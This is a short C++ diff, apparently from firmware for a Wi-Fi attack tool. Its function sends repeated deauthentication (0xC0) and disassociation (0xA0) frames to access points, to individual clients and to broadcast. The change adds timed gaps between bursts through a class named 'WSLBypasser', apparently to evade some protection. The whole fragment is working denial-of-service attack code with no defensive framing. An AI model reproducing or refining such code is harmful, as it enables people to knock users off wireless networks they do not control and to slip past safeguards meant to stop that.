@@ -33,7 +33,9 @@ void pan(const Ctx& ctx) {
                     } else {
                         for (uint8_t r = 0; r < rounds; r++) {
                             ctx.sendRawMgmt(0xC0, b.bssid, b.clients[c]);
+                            delay(WSLBypasser::burstLegGapMs());
                             ctx.sendRawMgmt(0xA0, b.bssid, b.clients[c]);
+                            if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
                         }
                     }
                     if (ctx.eapolTx) {
@@ -45,7 +47,9 @@ void pan(const Ctx& ctx) {
             } else if (ctx.bidirKick) {
                 for (uint8_t r = 0; r < rounds; r++) {
                     ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
+                    delay(WSLBypasser::burstLegGapMs());
                     ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
+                    if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
                 }
             }
             yield();
